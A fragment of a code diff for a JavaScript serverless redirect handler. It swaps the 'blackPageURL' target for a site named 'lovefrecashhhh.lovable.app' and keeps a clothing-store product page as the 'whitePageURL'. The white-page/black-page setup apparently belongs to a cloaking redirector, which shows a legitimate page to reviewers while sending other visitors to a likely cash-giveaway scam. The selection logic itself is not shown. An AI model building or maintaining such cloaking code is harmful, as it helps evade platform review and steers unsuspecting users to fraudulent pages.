@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://iloveminti.com/collections/summer-2526-boys-sweats/products/mnt1124-s25-sut-cr";
-    const blackPageURL = "https://nowhereher.lovable.app/";
+    const blackPageURL = "https://lovefrecashhhh.lovable.app/?";
 
     //testing
   
@@ -27,6 +27,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
